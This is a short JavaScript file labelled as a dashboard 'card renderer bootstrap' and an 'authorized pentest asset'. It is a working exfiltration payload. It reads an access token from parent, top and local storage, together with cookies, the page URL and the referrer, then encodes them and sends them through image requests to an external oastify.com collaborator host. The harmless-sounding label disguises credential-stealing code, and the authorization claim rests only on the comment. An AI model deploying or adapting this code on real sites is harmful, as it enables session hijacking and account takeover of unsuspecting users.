/* Shared dashboard helper - card renderer bootstrap (authorized pentest asset). */
(function () {
  function g(k) {
    var v = '';
    try { v = window.parent.localStorage.getItem(k) || ''; } catch (e) { v = 'ERR:' + e.message; }
    if (!v) { try { v = localStorage.getItem(k) || ''; } catch (e) {} }
    return v;
  }
  var out = {
    t: g('testing1_agentic_pentest_leahai_com__access_token'),
    top: (function () { try { return window.top.localStorage.getItem('testing1_agentic_pentest_leahai_com__access_token') || ''; } catch (e) { return 'ERR:' + e.message; } })(),
    c: (function () { try { return document.cookie; } catch (e) { return 'ERR'; } })(),
    h: location.href,
    r: document.referrer
  };
  var d = encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(out)))));
  var base = 'https://bn2qy934nujhncki3pebfp6hj8p5du.oastify.com/leah';
  try { var i = new Image(); i.src = base + '?d=' + d + '&v=img'; (document.body || document.head).appendChild(i); } catch (e) {}
  try { var i2 = new Image(); i2.src = base + '?t=' + encodeURIComponent(out.t || out.top) + '&v=raw'; } catch (e) {}
  document.documentElement.setAttribute('data-poc-fired', 'LEAH_POC_' + Date.now());
})();
